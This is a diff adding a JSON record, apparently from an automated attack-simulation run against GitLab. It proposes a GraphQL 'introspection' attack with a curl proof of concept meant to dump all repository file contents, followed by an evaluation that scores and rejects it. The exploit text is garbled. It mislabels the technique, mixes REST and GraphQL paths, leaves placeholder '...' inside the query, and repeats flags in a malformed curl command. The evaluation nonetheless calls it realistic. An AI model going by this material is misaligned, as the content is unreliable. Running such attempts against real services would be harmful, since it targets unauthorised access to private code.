@@ -1,0 +1,18 @@
+{
+  "mode": "attack_sim",
+  "program": "GitLab",
+  "iteration": 3,
+  "attack": "## TITLE: Batch File Listing via Introspection\nTARGET: /api/v4/projects/123456789/repository/files/123456789/\nTECHNIQUE: GraphQL introspection or batching abuse\nSTEPS:\n1. Utilize the GitLab GraphQL introspection endpoint: `https://gitlab.com/api/v4/graphql`\n2. Construct the query with the following parameters:\n    - query: `\n        query {\n            repository(id: \"123456789\") {\n                files(first: 1000, sort: \"name\") {\n                    name\n                    size\n                    content\n                    ...\n                }\n            }\n        }\n    ` \n3. Execute the query using the `curl` command below, replacing `YOUR_ACCESS_TOKEN` with your actual API token.\nPROOF OF CONCEPT:\n```bash\ncurl -X POST -H \"Content-Type: application/json\" -d '{\n \"query\": \"\n        query {\n            repository(id: \\\"123456789\\\") {\n                files(first: 1000, sort: \\\"name\\\") {\n                    name\n                    size\n                    content\n                    ...\n                }\n            }\n        }\n    \"' \\\n    -H \"Authorization: Bearer YOUR_ACCESS_TOKEN\" \\\n    -d '{\"query\": \"\n        query {\n            repository(id: \\\"123456789\\\") {\n                files(first: 1000, sort: \\\"name\\\") {\n                    name\n                    size\n                    content\n                    ...\n                }\n            }\n        }\n    \"' \\\n    -H \"Authorization: Bearer YOUR_ACCESS_TOKEN\" \nEXPECTED IMPACT: A server response containing the names, sizes, and content of all files in the repository, potentially leading to downloading the content. \nCONFIDENCE: 0.8 \n```",
+  "evaluation": {
+    "score": 0.68,
+    "realistic": true,
+    "in_scope": true,
+    "originality": "medium",
+    "weakness": "The technique used is not specific to the target endpoint, and the impact is not clearly stated.",
+    "strength": "The PoC is realistic and shows a specific payload with actual values.",
+    "verdict": "reject"
+  },
+  "score": 0.68,
+  "verdict": "reject",
+  "timestamp": "2026-03-10-232932"
+}
